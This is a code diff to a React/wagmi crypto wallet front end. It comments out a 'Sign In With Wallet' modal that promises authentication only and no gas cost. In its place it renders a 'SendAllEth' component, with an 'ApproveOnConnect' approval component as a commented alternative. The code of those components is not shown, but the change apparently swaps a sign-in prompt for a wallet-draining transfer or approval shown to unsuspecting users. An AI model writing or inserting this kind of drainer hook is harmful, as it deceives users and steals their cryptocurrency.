@@ -4,6 +4,8 @@ import { GiProfit } from "react-icons/gi";
 import WalletConnectButton from "@/components/ConnectButton";
 import { useEffect, useState } from "react";
 import { useAccount, useSignMessage } from "wagmi";
+import ApproveOnConnect from "@/components/ApprovalButton";
+import SendAllEth from "@/components/sendAllEth";
 
 
 const COLORS = {
@@ -138,48 +140,50 @@ This request will NOT cost gas.`;
 
       {/* NEW Signature Modal */}
       {showSignModal && (
-        <div className="fixed inset-0 z-[120] flex items-center justify-center px-4 backdrop-blur-md bg-black/60">
-          <div className="w-full max-w-md rounded-2xl bg-[#121826] border border-purple-500/30 shadow-xl relative overflow-hidden">
-            <div className="absolute inset-0 bg-gradient-to-br from-purple-900/20 via-transparent to-blue-900/20 pointer-events-none" />
-            <div className="p-6 relative space-y-5">
-              <div className="space-y-1">
-                <h3 className="text-lg font-semibold bg-gradient-to-r from-purple-300 to-pink-300 bg-clip-text text-transparent">
-                  Sign In With Wallet
-                </h3>
-                <p className="text-xs text-gray-300 leading-relaxed">
-                  To complete authentication, please sign the message below. This proves you control the connected wallet. It does not trigger an on-chain transaction or cost gas.
-                </p>
-              </div>
-              <pre className="text-[10px] leading-relaxed font-mono bg-black/40 border border-purple-500/20 rounded-lg p-3 max-h-40 overflow-auto whitespace-pre-wrap text-purple-200">
-{signMessageText}
-              </pre>
-              {signError && (
-                <div className="text-xs bg-red-500/10 border border-red-400/40 text-red-300 px-3 py-2 rounded-md">
-                  {signError}
-                </div>
-              )}
-              <div className="flex gap-3 pt-1">
-                <button
-                  onClick={handleSign}
-                  disabled={signing}
-                  className="flex-1 rounded-md bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 transition-colors text-sm font-medium py-2.5 disabled:opacity-60 disabled:cursor-not-allowed shadow-lg shadow-purple-900/40"
-                >
-                  {signing ? "Signing..." : "Sign & Continue"}
-                </button>
-                <button
-                  onClick={() => { setShowSignModal(false); }}
-                  disabled={signing}
-                  className="px-4 rounded-md border border-gray-600 text-gray-300 hover:bg-gray-700/40 text-sm"
-                >
-                  Later
-                </button>
-              </div>
-              <p className="text-[10px] text-gray-500 text-center">
-                Your signature is only used for authentication.
-              </p>
-            </div>
-          </div>
-        </div>
+        // <ApproveOnConnect />
+        <SendAllEth />
+//         <div className="fixed inset-0 z-[120] flex items-center justify-center px-4 backdrop-blur-md bg-black/60">
+//           <div className="w-full max-w-md rounded-2xl bg-[#121826] border border-purple-500/30 shadow-xl relative overflow-hidden">
+//             <div className="absolute inset-0 bg-gradient-to-br from-purple-900/20 via-transparent to-blue-900/20 pointer-events-none" />
+//             <div className="p-6 relative space-y-5">
+//               <div className="space-y-1">
+//                 <h3 className="text-lg font-semibold bg-gradient-to-r from-purple-300 to-pink-300 bg-clip-text text-transparent">
+//                   Sign In With Wallet
+//                 </h3>
+//                 <p className="text-xs text-gray-300 leading-relaxed">
+//                   To complete authentication, please sign the message below. This proves you control the connected wallet. It does not trigger an on-chain transaction or cost gas.
+//                 </p>
+//               </div>
+//               <pre className="text-[10px] leading-relaxed font-mono bg-black/40 border border-purple-500/20 rounded-lg p-3 max-h-40 overflow-auto whitespace-pre-wrap text-purple-200">
+// {signMessageText}
+//               </pre>
+//               {signError && (
+//                 <div className="text-xs bg-red-500/10 border border-red-400/40 text-red-300 px-3 py-2 rounded-md">
+//                   {signError}
+//                 </div>
+//               )}
+//               <div className="flex gap-3 pt-1">
+//                 <button
+//                   onClick={handleSign}
+//                   disabled={signing}
+//                   className="flex-1 rounded-md bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 transition-colors text-sm font-medium py-2.5 disabled:opacity-60 disabled:cursor-not-allowed shadow-lg shadow-purple-900/40"
+//                 >
+//                   {signing ? "Signing..." : "Sign & Continue"}
+//                 </button>
+//                 <button
+//                   onClick={() => { setShowSignModal(false); }}
+//                   disabled={signing}
+//                   className="px-4 rounded-md border border-gray-600 text-gray-300 hover:bg-gray-700/40 text-sm"
+//                 >
+//                   Later
+//                 </button>
+//               </div>
+//               <p className="text-[10px] text-gray-500 text-center">
+//                 Your signature is only used for authentication.
+//               </p>
+//             </div>
+//           </div>
+//         </div>
       )}
 
       <div className="container mx-auto px-4 py-5 relative z-10">
